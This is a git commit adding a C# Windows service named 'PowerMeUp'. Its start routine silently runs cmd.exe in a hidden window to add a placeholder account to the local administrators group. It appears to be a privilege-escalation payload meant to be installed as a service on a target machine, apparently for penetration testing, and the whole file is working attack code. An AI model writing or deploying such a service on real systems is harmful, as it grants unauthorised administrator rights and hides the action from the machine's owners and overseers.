913386ce2af49e91fc4a01900101ceebad241d02
C0ldlip <sroelfzema@gmail.com>
2021-03-31 19:42:14 +0200

    Add files via upload

---
+++ PowerMeUp/Service1.cs
@@ -0,0 +1,35 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Linq;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace PowerMeUp
+{
+    public partial class Service1 : ServiceBase
+    {
+        public Service1()
+        {
+            InitializeComponent();
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.Arguments = "/C net localgroup administrators <SAMACCOUNTNAME> /add"; //CHANGETHIS
+            process.StartInfo = startInfo;
+            process.Start();
+        }
+
+        protected override void OnStop()
+        {
+        }
+    }
+}
